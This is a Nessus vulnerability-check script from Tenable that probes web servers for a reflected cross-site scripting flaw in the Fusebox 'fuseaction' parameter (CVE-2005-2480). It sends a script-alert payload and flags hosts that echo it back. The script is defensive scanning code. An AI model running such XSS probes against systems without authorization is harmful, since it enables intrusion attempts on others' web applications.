#
# (C) Tenable Network Security
#


if (description) {
  script_id(19383);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2005-2480");
  script_bugtraq_id(14460);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"18520");

  name["english"] = "Fusebox fuseaction Parameter Cross-Site Scripting Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a web application that is vulnerable to
a cross-site scripting attack. 

Description :

The remote host is running Fusebox, a framework for building web-based
applications in Cold Fusion and PHP. 

The installed web application appears to have been created using
Fusebox in such a way that it fails to sanitize user-supplied input to
the 'fuseaction' parameter before using it in dynamically generated
webpages. 

Note that this flaw may not be specific to the Fusebox framework per
se but instead be an implementation issue since Fusebox itself does
not generate any HTML but lets the developer control all output. 

See also : 

http://archives.neohapsis.com/archives/bugtraq/2005-08/0043.html
http://archives.neohapsis.com/archives/bugtraq/2005-08/0135.html

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:H/Au:NR/C:N/A:N/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for fuseaction parameter cross-site scripting vulnerability in Fusebox";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + "');</script>";


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Request the initial page.
  res = http_get_cache(item:string(dir, "/"), port:port);
  if (res == NULL) exit(0);

  # Find an existing request handler.
  pat = 'a href=".+(\\?fuseaction=|/fuseaction/)([^"]+)';
  matches = egrep(string:res, pattern:pat);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      handler = eregmatch(string:match, pattern:pat);
      if (!isnull(handler)) {
        handler = handler[2];
        break;
      }
    }
  }

  # Try to exploit the flaw.
  if (handler) {
    req = http_get(
      item:string(
        dir, "/?",
        "fuseaction=", handler, urlencode(str:string('">', xss))
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see our XSS.
    if (xss >< res) {
      security_note(port);
      exit(0);
    }
  }
}
